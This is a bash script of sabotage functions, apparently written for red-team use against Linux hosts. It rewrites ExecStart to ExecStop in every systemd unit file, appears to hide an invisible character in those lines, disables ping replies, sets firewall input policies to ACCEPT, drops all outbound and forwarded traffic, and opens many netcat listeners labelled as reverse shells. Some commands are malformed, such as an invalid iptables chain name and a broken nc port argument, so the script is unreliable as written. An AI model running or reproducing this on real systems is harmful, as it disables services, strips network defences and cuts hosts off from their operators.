#!/bin/bash


zwnj () {
        for service in $(find /usr/lib/systemd/system -maxdepth 1 -type f)
        do sed -i 's/ExecStart=/ExecStart=/g' $service
        done
}

swap () {
        for service in $(find /usr/lib/systemd/system -maxdepth 1 -type f)
        do sed -i 's/ExecStart=/ExecStop=/g' $service
        done
}

disableICMPKernel () {
        sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
}

disableICMPProc () {
        echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
}

disableICMPiptables () {
        iptables -t mangle -A INPUT/PREROUTING -j ACCEPT
        iptables -A INPUT -p icmp --icmp-type 8 -j DROP
}

generateReverseShells () {
        for port in $(seq 1 100)
        do nc -nlvp $(shuf -i 100-1000 -n 50)
        done
}

disableFirewall () {
        iptables -t raw -P PREROUTING ACCEPT
        iptables -t mangle -P PREROUTING ACCEPT
        iptables -t mangle -P INPUT ACCEPT
        iptables -t nat -P PREROUTING ACCEPT
        iptables -t nat -P INPUT ACCEPT
        iptables -t filter -P INPUT ACCEPT
}

redboardiptables () {
        iptables -t mangle -P FORWARD DROP
        iptables -t filter -P FORWARD DROP
        iptables -t raw -P OUTPUT DROP
        iptables -t mangle -P OUTPUT DROP
        iptables -t nat -P OUTPUT DROP
        iptables -t filter -P OUTPUT DROP
        iptables -t mangle -P POSTROUTING DROP
        iptables -t nat -P POSTROUTING DROP
}
